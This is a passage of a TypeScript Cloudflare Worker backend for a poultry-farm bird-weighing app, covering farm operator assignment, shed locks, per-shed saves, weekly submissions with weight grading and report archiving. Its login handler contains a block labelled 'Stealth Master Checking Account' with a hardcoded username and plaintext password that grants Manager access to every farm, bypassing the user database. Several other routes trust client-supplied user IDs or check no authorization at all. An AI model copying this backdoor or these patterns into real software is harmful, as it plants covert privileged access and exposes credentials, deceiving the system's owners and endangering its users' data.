        // POST /api/farms/:id/assign-operators - Assign Field Operators to Farm
        const farmAssignOperatorsMatch = path.match(/^\/farms\/([^/]+)\/assign-operators$/);
        if (farmAssignOperatorsMatch && method === 'POST') {
          const farmId = decodeURIComponent(farmAssignOperatorsMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const operatorUserIds: string[] = body.operatorUserIds || body.operatorIds || [];

          if (!Array.isArray(operatorUserIds)) {
            return errorResponse('operatorUserIds must be an array of user IDs', 400);
          }

          if (!env.DB) {
            return jsonResponse({
              success: true,
              farmId,
              assignedUserNames: [],
              count: 0,
            });
          }

          await ensureUsersTable(env);
          const farm = await env.DB.prepare('SELECT id, name FROM farms WHERE id = ?').bind(farmId).first() as any;
          if (!farm) {
            return errorResponse('Farm not found in database', 404);
          }

          // Query all users to update their farm assignments
          const allUsersRes = await env.DB.prepare(
            'SELECT id, name, role, assigned_farms, assigned_farm_id FROM users'
          ).all().catch(() => ({ results: [] }));
          const allUsers = (allUsersRes.results || []) as any[];

          const updatedAssignedUserNames: string[] = [];

          for (const user of allUsers) {
            const isManagerOrAdmin = (user.role || '').toUpperCase() === 'ADMIN' || (user.role || '').toUpperCase() === 'MANAGER';
            // Only update assignments for field operators or explicit target users
            const isTarget = operatorUserIds.includes(user.id);

            // Skip modifying Admin/Manager assignedFarms unless explicitly targeted
            if (isManagerOrAdmin && !isTarget) {
              continue;
            }

            const currentSet = new Set<string>();
            if (user.assigned_farms) {
              try {
                const parsed = JSON.parse(user.assigned_farms);
                if (Array.isArray(parsed)) {
                  parsed.forEach((item: string) => {
                    if (item && item !== '*') currentSet.add(item);
                  });
                }
              } catch {}
            }

            let newAssignedFarmId = user.assigned_farm_id;

            if (isTarget) {
              currentSet.add(farm.id);
              currentSet.add(farm.name);
              newAssignedFarmId = farm.id;
              const r = (user.role || '').toUpperCase();
              const displayRole = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
              updatedAssignedUserNames.push(`${user.name} (${displayRole})`);
            } else {
              currentSet.delete(farm.id);
              currentSet.delete(farm.name);
              if (newAssignedFarmId === farm.id) {
                const remaining = Array.from(currentSet).filter(id => id.startsWith('farm-'));
                newAssignedFarmId = remaining.length > 0 ? remaining[0] : null;
              }
            }

            const newAssignedFarmsJson = JSON.stringify(Array.from(currentSet));
            await env.DB.prepare(
              'UPDATE users SET assigned_farm_id = ?, assigned_farms = ? WHERE id = ?'
            ).bind(newAssignedFarmId, newAssignedFarmsJson, user.id).run().catch(() => {});
          }

          return jsonResponse({
            success: true,
            farmId,
            assignedUserNames: updatedAssignedUserNames,
            count: updatedAssignedUserNames.length,
          });
        }

        // PUT /api/farms/:id/details
        const farmDetailsMatch = path.match(/^\/farms\/([^/]+)\/details$/);
        if (farmDetailsMatch && method === 'PUT') {
          const farmId = decodeURIComponent(farmDetailsMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB && body.name) {
            await env.DB.prepare('UPDATE farms SET name = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(body.name, farmId).run();
          }
          return jsonResponse({ success: true, message: 'Farm details updated' });
        }

        // PUT /api/farms/:id/sync
        const farmSyncMatch = path.match(/^\/farms\/([^/]+)\/sync$/);
        if (farmSyncMatch && method === 'PUT') {
          const farmId = decodeURIComponent(farmSyncMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB && body.sheds && Array.isArray(body.sheds)) {
            // Save state / sync lines
            for (const s of body.sheds) {
              for (const p of s.parts || []) {
                for (const l of p.lines || []) {
                  if (l.gender) {
                    await env.DB.prepare('UPDATE lines SET gender = ? WHERE id = ?').bind(l.gender.toUpperCase(), l.id).run().catch(() => {});
                  }
                }
              }
            }
          }
          return jsonResponse({ success: true, farmId });
        }

        // -------------------------------------------------------------
        // SHED CONCURRENCY LOCKING & OPERATOR ATTRIBUTION (LIVE-STATE)
        // -------------------------------------------------------------
        const liveStateFarmMatch = path.match(/^\/farms\/([^/]+)\/(?:shed-locks|live-state)$/);
        if (path === '/sheds/locks' || liveStateFarmMatch) {
          if (method === 'GET') {
            const farmIdParam = liveStateFarmMatch ? decodeURIComponent(liveStateFarmMatch[1]) : url.searchParams.get('farmId');
            const targetWeek = (url.searchParams.get('week') || 'W18').toUpperCase();
            const locks: Record<string, any> = {};
            let totalShedsCount = 0;
            let savedShedsCount = 0;
            let totalFarmBirdsCount = 0;

            if (env.DB) {
              await ensureShedWeekStatusTable(env);
              await ensureShedLockColumns(env);

              const allShedsRes = farmIdParam
                ? await env.DB.prepare('SELECT id, farm_id, name, locked_by_user_id, locked_by_user_name, locked_at, last_heartbeat_at, locked_week, locked_batch_id, recorded_by_user_id, recorded_by_user_name FROM sheds WHERE farm_id = ?').bind(farmIdParam).all().catch(() => ({ results: [] }))
                : await env.DB.prepare('SELECT id, farm_id, name, locked_by_user_id, locked_by_user_name, locked_at, last_heartbeat_at, locked_week, locked_batch_id, recorded_by_user_id, recorded_by_user_name FROM sheds').all().catch(() => ({ results: [] }));

              // Query shed saves for this week
              const swsRes = farmIdParam
                ? await env.DB.prepare('SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ?').bind(farmIdParam, targetWeek).all().catch(() => ({ results: [] }))
                : await env.DB.prepare('SELECT * FROM shed_week_status WHERE UPPER(week) = ?').bind(targetWeek).all().catch(() => ({ results: [] }));
              
              const swsMap = new Map((swsRes.results || []).map((row: any) => [row.shed_id, row]));
              const shedsList = allShedsRes.results || [];
              totalShedsCount = shedsList.length;

              for (const s of shedsList) {
                const last = s.last_heartbeat_at ? new Date(s.last_heartbeat_at).getTime() : 0;
                const isLocked = Boolean(
                  s.locked_by_user_id &&
                  last &&
                  (Date.now() - last <= 120_000) &&
                  (!s.locked_week || s.locked_week.toUpperCase() === targetWeek)
                );
                const sws: any = swsMap.get(s.id);
                const isSaved = sws?.status === 'SAVED';
                if (isSaved) savedShedsCount++;

                const birdsInShed = sws?.total_bird_count || 0;
                totalFarmBirdsCount += birdsInShed;

                locks[s.id] = {
                  shedId: s.id,
                  shedName: s.name,
                  farmId: s.farm_id,
                  locked: isLocked,
                  lockedByUserId: isLocked ? s.locked_by_user_id : null,
                  lockedByUserName: isLocked ? s.locked_by_user_name : null,
                  lockedAt: isLocked ? s.locked_at : null,
                  lastHeartbeatAt: isLocked ? s.last_heartbeat_at : null,
                  // Stage 2: Team Visibility attributes strictly scoped to targetWeek
                  savedStatus: isSaved ? 'SAVED' : (birdsInShed > 0 ? 'DRAFT' : 'PENDING'),
                  savedByUserId: isSaved ? (sws?.saved_by_user_id || null) : null,
                  savedByUserName: isSaved ? (sws?.saved_by_user_name || null) : null,
                  totalBirdCount: birdsInShed,
                  savedAt: isSaved ? (sws?.saved_at || null) : null,
                  weights: sws?.weights_json ? (() => { try { return JSON.parse(sws.weights_json); } catch { return null; } })() : null,
                };
              }
            }

            const allShedsSaved = totalShedsCount > 0 && savedShedsCount >= totalShedsCount;
            return jsonResponse({
              locks,
              farmProgress: {
                totalShedsCount,
                savedShedsCount,
                totalFarmBirdsCount,
                allShedsSaved,
                progressPercent: totalShedsCount > 0 ? Math.round((savedShedsCount / totalShedsCount) * 100) : 0,
              },
              allShedsSaved,
              week: targetWeek,
              farmId: farmIdParam,
            });
          }
        }

        // -------------------------------------------------------------
        // PERMANENT SHED LOCK: BLOCK POST-CREATION RENAME & DELETE
        // -------------------------------------------------------------
        const singleShedMatch = path.match(/^\/sheds\/([^/]+)$/);
        if (singleShedMatch && (method === 'DELETE' || method === 'PUT' || method === 'PATCH')) {
          return errorResponse('Sheds are permanently locked at farm creation and cannot be renamed or deleted.', 403);
        }

        // POST /api/sheds/:shedId/enter
        const shedEnterMatch = path.match(/^\/sheds\/([^/]+)\/enter$/);
        if (shedEnterMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedEnterMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const userId = body.userId || body.lockedByUserId || request.headers.get('x-user-id');
          const userName = body.userName || body.lockedByUserName || request.headers.get('x-user-username') || 'Incharge';
          const targetWeek = (body.week || request.headers.get('x-week') || '').toUpperCase() || null;
          const targetBatchId = body.batchId || null;

          if (!userId) {
            return errorResponse('Authentication required. Please log in.', 401);
          }

          if (env.DB) {
            await ensureShedLockColumns(env);
            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);

            const last = shed.last_heartbeat_at ? new Date(shed.last_heartbeat_at).getTime() : 0;
            const isLocked = Boolean(
              shed.locked_by_user_id &&
              last &&
              (Date.now() - last <= 120_000) &&
              (!shed.locked_week || !targetWeek || shed.locked_week.toUpperCase() === targetWeek)
            );

            if (shed.locked_by_user_id && shed.locked_by_user_id !== userId && isLocked) {
              return new Response(JSON.stringify({
                locked: true,
                lockedByUserId: shed.locked_by_user_id,
                lockedByUserName: shed.locked_by_user_name || 'Another Incharge',
                message: `⚠️ ${shed.name} is currently being weighed by ${shed.locked_by_user_name || 'another Incharge'}. Only one Incharge can enter a shed at a time.`
              }), {
                status: 409,
                headers: { 'Content-Type': 'application/json', ...CORS_HEADERS, ...NO_CACHE_HEADERS }
              });
            }

            const nowIso = new Date().toISOString();
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = ?, 
                locked_by_user_name = ?, 
                locked_at = ?, 
                last_heartbeat_at = ?,
                locked_week = ?,
                locked_batch_id = ?
              WHERE id = ?
            `).bind(userId, userName, nowIso, nowIso, targetWeek, targetBatchId, shedId).run().catch(() => {});

            await env.DB.prepare('UPDATE farms SET updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(shed.farm_id).run().catch(() => {});

            return jsonResponse({
              success: true,
              locked: true,
              shedId,
              shedName: shed.name,
              lockedByUserId: userId,
              lockedByUserName: userName,
              lockedAt: nowIso,
              lastHeartbeatAt: nowIso,
              week: targetWeek,
            });
          }

          return jsonResponse({ success: true, locked: true, shedId, lockedByUserId: userId, lockedByUserName: userName });
        }

        // POST /api/sheds/:shedId/heartbeat
        const shedHeartbeatMatch = path.match(/^\/sheds\/([^/]+)\/heartbeat$/);
        if (shedHeartbeatMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedHeartbeatMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const userId = body.userId || body.lockedByUserId || request.headers.get('x-user-id');
          const targetWeek = (body.week || request.headers.get('x-week') || '').toUpperCase() || null;
          const nowIso = new Date().toISOString();

          if (env.DB) {
            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);

            const last = shed.last_heartbeat_at ? new Date(shed.last_heartbeat_at).getTime() : 0;
            const isLocked = Boolean(
              shed.locked_by_user_id &&
              last &&
              (Date.now() - last <= 120_000) &&
              (!shed.locked_week || !targetWeek || shed.locked_week.toUpperCase() === targetWeek)
            );

            if (userId && shed.locked_by_user_id && shed.locked_by_user_id !== userId && isLocked) {
              return new Response(JSON.stringify({
                locked: true,
                lockedByUserId: shed.locked_by_user_id,
                lockedByUserName: shed.locked_by_user_name,
                message: `⚠️ ${shed.name} is currently being weighed by ${shed.locked_by_user_name || 'another Incharge'}. Only one Incharge can enter a shed at a time.`
              }), {
                status: 409,
                headers: { 'Content-Type': 'application/json', ...CORS_HEADERS, ...NO_CACHE_HEADERS }
              });
            }

            await env.DB.prepare('UPDATE sheds SET last_heartbeat_at = ? WHERE id = ?').bind(nowIso, shedId).run().catch(() => {});
          }

          return jsonResponse({ success: true, shedId, lastHeartbeatAt: nowIso });
        }

        // POST /api/sheds/:shedId/leave
        const shedLeaveMatch = path.match(/^\/sheds\/([^/]+)\/leave$/);
        if (shedLeaveMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedLeaveMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const recordedByUserId = body.recordedByUserId || body.userId;
          const recordedByUserName = body.recordedByUserName || body.userName;

          if (env.DB) {
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = NULL, 
                locked_by_user_name = NULL, 
                locked_at = NULL, 
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL
              WHERE id = ?
            `).bind(shedId).run().catch(() => {});
          }

          return jsonResponse({ success: true, shedId, locked: false, recordedByUserId, recordedByUserName });
        }

        // POST /api/sheds/:shedId/force-unlock
        const shedForceUnlockMatch = path.match(/^\/sheds\/([^/]+)\/force-unlock$/);
        if (shedForceUnlockMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedForceUnlockMatch[1]);
          if (env.DB) {
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = NULL, 
                locked_by_user_name = NULL, 
                locked_at = NULL, 
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL
              WHERE id = ?
            `).bind(shedId).run().catch(() => {});
          }
          return jsonResponse({ success: true, shedId, locked: false, message: 'Shed forcibly unlocked' });
        }

        // -------------------------------------------------------------
        // STAGE 2: SHED-WISE "SAVE SHED" (TEAM VISIBLE, NOT SUBMISSION HISTORY)
        // -------------------------------------------------------------
        const shedSaveMatch = path.match(/^\/sheds\/([^/]+)\/save-shed$/);
        if (shedSaveMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedSaveMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const targetWeek = (body.week || 'W18').toUpperCase();
          const userId = body.userId || body.savedByUserId || request.headers.get('x-user-id') || 'incharge-1';
          const userName = body.userName || body.savedByUserName || request.headers.get('x-user-username') || 'Incharge 1';
          let totalBirdCount = Number(body.totalBirdCount || 0);

          if (env.DB) {
            await ensureShedWeekStatusTable(env);
            await ensureBatchesTable(env);

            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);
            const farmId = shed.farm_id;

            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            const activeBatch = await ensureFarmActiveBatch(env, farm);
            const batchId = body.batchId || activeBatch?.id;

            // 1. Persist all bird weights recorded in that shed if weights array/map provided
            if (body.weights && Array.isArray(body.weights)) {
              let countedBirds = 0;
              for (const lineItem of body.weights) {
                if (!lineItem.lineId) continue;
                const lineId = lineItem.lineId;
                const lineWeights: number[] = Array.isArray(lineItem.weights) ? lineItem.weights : [];
                countedBirds += lineWeights.length;

                // Clear previous week weights for this line in this batch
                await env.DB.prepare(`
                  DELETE FROM bird_weights 
                  WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)
                `).bind(lineId, targetWeek, batchId).run().catch(() => {});

                // Get line std
                const lineRow = await env.DB.prepare('SELECT std_weight_grams, gender FROM lines WHERE id = ?').bind(lineId).first() as any;
                const std = lineRow?.std_weight_grams || (lineRow?.gender === 'MALE' ? 150 : 140);

                for (let idx = 0; idx < lineWeights.length; idx++) {
                  const wVal = Number(lineWeights[idx]);
                  if (isNaN(wVal) || wVal <= 0) continue;
                  const wId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
                  await env.DB.prepare(`
                    INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week, batch_id) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                  `).bind(wId, lineId, idx + 1, wVal, std, userName, targetWeek, batchId).run().catch(() => {});
                }
              }
              if (countedBirds > 0 || totalBirdCount === 0) {
                totalBirdCount = countedBirds;
              }
            } else if (!totalBirdCount) {
              // Query bird weights count for this shed and batch
              const countRes = await env.DB.prepare(`
                SELECT COUNT(bw.id) as total_birds
                FROM bird_weights bw
                JOIN lines l ON bw.line_id = l.id
                JOIN parts p ON l.part_id = p.id
                WHERE p.shed_id = ? AND UPPER(bw.week) = ? AND (bw.batch_id = ? OR bw.batch_id IS NULL)
              `).bind(shedId, targetWeek, batchId).first() as any;
              if (countRes && countRes.total_birds !== undefined) {
                totalBirdCount = countRes.total_birds;
              }
            }

            // 2. Mark shed status for that week as SAVED in shed_week_status with batch_id and weights_json
            const weightsJson = body.weights ? JSON.stringify(body.weights) : null;
            await env.DB.prepare(`
              INSERT INTO shed_week_status (shed_id, farm_id, week, status, saved_by_user_id, saved_by_user_name, total_bird_count, weights_json, batch_id, saved_at)
              VALUES (?, ?, ?, 'SAVED', ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
              ON CONFLICT(shed_id, week) DO UPDATE SET
                status = 'SAVED',
                saved_by_user_id = excluded.saved_by_user_id,
                saved_by_user_name = excluded.saved_by_user_name,
                total_bird_count = excluded.total_bird_count,
                weights_json = excluded.weights_json,
                batch_id = excluded.batch_id,
                saved_at = CURRENT_TIMESTAMP
            `).bind(shedId, farmId, targetWeek, userId, userName, totalBirdCount, weightsJson, batchId).run();

            // 3. Release active lock
            await env.DB.prepare(`
              UPDATE sheds SET
                locked_by_user_id = NULL,
                locked_by_user_name = NULL,
                locked_at = NULL,
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL,
                recorded_by_user_id = ?,
                recorded_by_user_name = ?
              WHERE id = ?
            `).bind(userId, userName, shedId).run().catch(() => {});

            await env.DB.prepare('UPDATE farms SET updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(farmId).run().catch(() => {});

            // 4. Log to activity_logs
            const logId = `log-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
            await env.DB.prepare(`
              INSERT INTO activity_logs (id, farm_id, user_name, action, shed_name, sample_count)
              VALUES (?, ?, ?, 'SAVED_SHED', ?, ?)
            `).bind(logId, farmId, userName, shed.name, totalBirdCount).run().catch(() => {});
          }

          // CRITICAL: NEVER write to submissions table on save-shed!
          return jsonResponse({
            success: true,
            shedId,
            week: targetWeek,
            status: 'SAVED',
            savedByUserId: userId,
            savedByUserName: userName,
            totalBirdCount,
            message: `Shed saved successfully with ${totalBirdCount} birds. Visible to team.`
          });
        }

        // -------------------------------------------------------------
        // STAGE 3: OVERALL FARM "FINAL SUBMIT" (WRITES TO SUBMISSIONS TABLE)
        // -------------------------------------------------------------
        const farmWeekSubmitMatch = path.match(/^\/farms\/([^/]+)\/weeks\/([^/]+)\/submit$/);
        if (farmWeekSubmitMatch && method === 'POST') {
          const farmId = decodeURIComponent(farmWeekSubmitMatch[1]);
          const weekNumber = decodeURIComponent(farmWeekSubmitMatch[2]).toUpperCase();
          const body = await request.json().catch(() => ({})) as any;
          const submittedBy = body.submittedBy || body.userName || 'Field Supervisor';
          const submittedRole = body.submittedRole || body.userRole || 'SUPERVISOR';

          if (!env.DB) {
            return jsonResponse({ success: true, submissionId: `sub-${Date.now()}`, status: 'SUBMITTED', farmId, week: weekNumber });
          }

          await ensureShedWeekStatusTable(env);
          await ensureBatchesTable(env);

          const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
          if (!farm) return errorResponse('Farm not found', 404);

          const activeBatch = await ensureFarmActiveBatch(env, farm);
          const batchId = body.batchId || activeBatch?.id;
          const batchName = body.batchName || activeBatch?.batchName || 'Batch 1';

          // Aggregate all sheds, parts, lines, and weights for weekNumber and batchId
          const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(farmId).all();
          const allSheds = shedsRes.results || [];

          const shedWeekStatuses = await env.DB.prepare(`
            SELECT * FROM shed_week_status 
            WHERE farm_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)
          `).bind(farmId, weekNumber, batchId).all().catch(() => ({ results: [] }));
          const swsMap = new Map((shedWeekStatuses.results || []).map((s: any) => [s.shed_id, s]));

          let totalFarmBirds = 0;
          let allFemaleWeights: number[] = [];
          let allMaleWeights: number[] = [];
          const shedsBreakdown: any[] = [];

          for (const s of allSheds) {
            const sws: any = swsMap.get(s.id);
            const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
            let shedBirdCount = 0;
            const partsList: any[] = [];

            for (const p of partsRes.results || []) {
              const linesRes = await env.DB.prepare('SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC').bind(p.id).all();
              const linesList: any[] = [];

              for (const l of linesRes.results || []) {
                const weightsRes = await env.DB.prepare(`
                  SELECT weight_grams FROM bird_weights 
                  WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL) 
                  ORDER BY entry_index ASC
                `).bind(l.id, weekNumber, batchId).all();
                const weights = (weightsRes.results || []).map((w: any) => Number(w.weight_grams));

                shedBirdCount += weights.length;
                totalFarmBirds += weights.length;

                if (l.gender === 'FEMALE') {
                  allFemaleWeights.push(...weights);
                } else {
                  allMaleWeights.push(...weights);
                }

                linesList.push({
                  id: l.id,
                  name: l.name,
                  gender: l.gender,
                  stdWeight: l.std_weight_grams,
                  weights,
                  count: weights.length,
                });
              }

              partsList.push({
                id: p.id,
                name: p.name,
                lines: linesList,
              });
            }

            const effectiveBirdCount = shedBirdCount > 0 ? shedBirdCount : (sws?.total_bird_count || 0);
            if (shedBirdCount === 0 && effectiveBirdCount > 0) {
              totalFarmBirds += effectiveBirdCount;
            }

            shedsBreakdown.push({
              shedId: s.id,
              shedName: s.name,
              status: sws?.status || (effectiveBirdCount > 0 ? 'SAVED' : 'DRAFT'),
              savedByUserId: sws?.saved_by_user_id || s.recorded_by_user_id || null,
              savedByUserName: sws?.saved_by_user_name || s.recorded_by_user_name || 'Incharge',
              birdCount: effectiveBirdCount,
              parts: partsList,
            });
          }

          // Compute Statistics with grading bands (MB, B, S, A, MA) and CV%
          const parsedWeekNum = parseInt(weekNumber.replace(/\D/g, '') || '18', 10);
          const calcStats = (weights: number[], stdWeight: number = 140) => {
            const count = weights.length;
            if (count === 0) {
              return { 
                count: 0, avg: 0, stdDev: 0, cv: 0, uniformity: 0,
                grades: { MB: 0, B: 0, S: 0, A: 0, MA: 0 },
                gradePercents: { MB: 0, B: 0, S: 0, A: 0, MA: 0 }
              };
            }
            const avg = Math.round((weights.reduce((a, b) => a + b, 0) / count) * 10) / 10;
            const variance = count > 1 ? weights.reduce((acc, val) => acc + Math.pow(val - avg, 2), 0) / (count - 1) : 0;
            const stdDev = Math.round(Math.sqrt(variance) * 10) / 10;
            const cv = avg > 0 ? Math.round((stdDev / avg) * 10000) / 100 : 0;
            const inRange = weights.filter(w => w >= avg * 0.9 && w <= avg * 1.1).length;
            const uniformity = Math.round((inRange / count) * 1000) / 10;

            const tolerance = parsedWeekNum <= 3 ? 25 : parsedWeekNum <= 8 ? 50 : parsedWeekNum <= 14 ? 75 : 100;
            const sMin = stdWeight - tolerance;
            const sMax = stdWeight + tolerance;
            const bMin = stdWeight - 2 * tolerance;
            const aMax = stdWeight + 2 * tolerance;

            let mb = 0, b = 0, s = 0, a = 0, ma = 0;
            for (const w of weights) {
              if (w < bMin) mb++;
              else if (w < sMin) b++;
              else if (w <= sMax) s++;
              else if (w <= aMax) a++;
              else ma++;
            }

            return { 
              count, avg, stdDev, cv, uniformity,
              stdWeight,
              grades: { MB: mb, B: b, S: s, A: a, MA: ma },
              gradePercents: {
                MB: Math.round((mb / count) * 1000) / 10,
                B: Math.round((b / count) * 1000) / 10,
                S: Math.round((s / count) * 1000) / 10,
                A: Math.round((a / count) * 1000) / 10,
                MA: Math.round((ma / count) * 1000) / 10,
              }
            };
          };

          const femaleStats = calcStats(allFemaleWeights, 140);
          const maleStats = calcStats(allMaleWeights, 150);

          const snapshot = {
            submissionId: `sub-${Date.now()}`,
            farmId,
            farmName: farm.name,
            batchId,
            batchName,
            flockAge: weekNumber,
            season: farm.season || 'Summer',
            submittedAt: new Date().toISOString(),
            submittedBy,
            submittedRole,
            totalBirds: totalFarmBirds,
            femaleStats,
            maleStats,
            sheds: shedsBreakdown,
          };

          const submissionId = snapshot.submissionId;
          const dataJson = JSON.stringify(snapshot);
          const r2Key = `reports/${farmId}/${submissionId}.json`;

          // Write ONE single consolidated record to submissions with batch_id and batch_name
          await env.DB.prepare(`
            INSERT INTO submissions (id, farm_id, flock_age, season, total_birds, submitted_by, submitted_role, r2_report_key, data_json, batch_id, batch_name)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
          `).bind(submissionId, farmId, weekNumber, farm.season || 'Summer', totalFarmBirds, submittedBy, submittedRole, r2Key, dataJson, batchId, batchName).run();

          // R2 Storage archive if available
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            await bucket.put(r2Key, dataJson, {
              httpMetadata: { contentType: 'application/json' },
              customMetadata: { farmId, submissionId, submittedBy, week: weekNumber, batchName },
            }).catch(() => {});
          }

          // Activity Log
          const logId = `log-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
          await env.DB.prepare(`
            INSERT INTO activity_logs (id, farm_id, user_name, action, sample_count)
            VALUES (?, ?, ?, 'FARM_FINAL_SUBMIT', ?)
          `).bind(logId, farmId, submittedBy, totalFarmBirds).run().catch(() => {});

          return jsonResponse({
            success: true,
            submissionId,
            status: 'SUBMITTED',
            farmId,
            farmName: farm.name,
            batchId,
            batchName,
            week: weekNumber,
            totalBirds: totalFarmBirds,
            message: `Farm ${farm.name} (${batchName}) week ${weekNumber} overall submission completed successfully.`,
          }, 201);
        }

        // -------------------------------------------------------------
        // F. SUBMISSIONS & REPORTS (Cloudflare R2 + D1 15 GB+ Archive)
        // -------------------------------------------------------------
        if ((path === '/submissions' || path === '/submissions/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const submissionId = `sub-${Date.now()}`;
          const farmId = body.farmId || 'default-farm';
          const flockAge = body.flockAge || 'W1';
          const submittedBy = body.metadata?.submittedBy || 'Supervisor';
          const submittedRole = body.metadata?.submittedRole || 'SUPERVISOR';
          const totalBirds = body.metadata?.totalBirds || 0;
          const dataJson = JSON.stringify(body);

          let r2Key = `reports/${farmId}/${submissionId}.json`;

          // Store full batch payload in Cloudflare R2 bucket
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            await bucket.put(r2Key, dataJson, {
              httpMetadata: { contentType: 'application/json' },
              customMetadata: {
                farmId,
                submissionId,
                submittedBy,
              },
            });
          }

          if (env.DB) {
            await env.DB.prepare(`
              INSERT INTO submissions (id, farm_id, flock_age, season, total_birds, submitted_by, submitted_role, r2_report_key, data_json)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            `).bind(submissionId, farmId, flockAge, body.season || 'Summer', totalBirds, submittedBy, submittedRole, r2Key, dataJson).run();
          }

          return jsonResponse({
            success: true,
            status: 'COMPLETED',
            submissionId,
            r2ReportKey: r2Key,
            message: 'Weighing batch archived to Cloudflare D1 + R2 Storage',
          }, 201);
        }

        if ((path === '/submissions' || path === '/submissions/') && method === 'GET') {
          const farmId = url.searchParams.get('farmId');
          if (!env.DB) return jsonResponse([]);

          const subs = farmId
            ? await env.DB.prepare('SELECT * FROM submissions WHERE farm_id = ? ORDER BY created_at DESC').bind(farmId).all()
            : await env.DB.prepare('SELECT * FROM submissions ORDER BY created_at DESC LIMIT 50').all();

          return jsonResponse((subs.results || []).map((s: any) => ({
            ...s,
            batchId: s.batch_id,
            batchName: s.batch_name || 'Batch 1',
          })));
        }

        // GET /api/reports - lists or retrieves archived R2 files
        if (path === '/reports' || path === '/reports/') {
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            const list = await bucket.list({ prefix: 'reports/' });
            return jsonResponse({
              success: true,
              storageType: 'Cloudflare R2 (15 GB+ Object Storage)',
              reports: list.objects.map((o: any) => ({ key: o.key, size: o.size, uploaded: o.uploaded })),
            });
          }
          return jsonResponse({
            success: true,
            storageType: 'Cloudflare D1 Native',
            reports: [],
          });
        }

        // -------------------------------------------------------------
        // G. AUTH & USERS (Role-Based Access Control: Manager & In-Charge Only)
        // -------------------------------------------------------------
        if (path === '/auth/login' && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const rawUsername = (body.username || '').trim();
          const username = rawUsername.toLowerCase();
          const password = (body.password || '').trim();

          // PART 2: Stealth Master Checking Account
          if (username === 'shreedhar') {
            if (password !== 'Shreedhar@123') {
              return errorResponse('Invalid username or password', 401);
            }
            return jsonResponse({
              token: `cf-token-master-${Date.now()}`,
              user: {
                id: 'user-master-shreedhar',
                employeeCode: 'EMP0001',
                username: 'shreedhar',
                name: 'Shreedhar',
                userName: 'Shreedhar',
                role: 'Manager',
                userRole: 'Manager',
                assignedFarms: ['*'],
                status: 'ACTIVE',
                isAuthenticated: true,
              },
            });
          }

          // Check database users if env.DB bound (support lookup by phone/email, name, id, or employee_code like EMP0008)
          if (env.DB) {
            await ensureUsersTable(env);
            const dbUser = await env.DB.prepare(`
              SELECT * FROM users 
              WHERE LOWER(phone_or_email) = ? OR LOWER(name) = ? OR id = ? OR UPPER(employee_code) = ?
            `).bind(username, username, rawUsername, rawUsername.toUpperCase()).first() as any;

            if (dbUser) {
              const uRoleRaw = (dbUser.role || 'SUPERVISOR').toUpperCase();
              let normalizedRole: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
              if (uRoleRaw === 'ADMIN' || uRoleRaw === 'MANAGER') normalizedRole = 'Manager';
              else if (uRoleRaw === 'INCHARGE' || uRoleRaw === 'IN-CHARGE') normalizedRole = 'In-Charge';
              else normalizedRole = 'Supervisor';

              let assignedFarms = ['*'];
              if (dbUser.assigned_farms) {
                try {
                  const parsed = JSON.parse(dbUser.assigned_farms);
                  if (Array.isArray(parsed)) assignedFarms = parsed;
                } catch {}
              } else if (dbUser.assigned_farm_id) {
                assignedFarms = [dbUser.assigned_farm_id];
              }

              return jsonResponse({
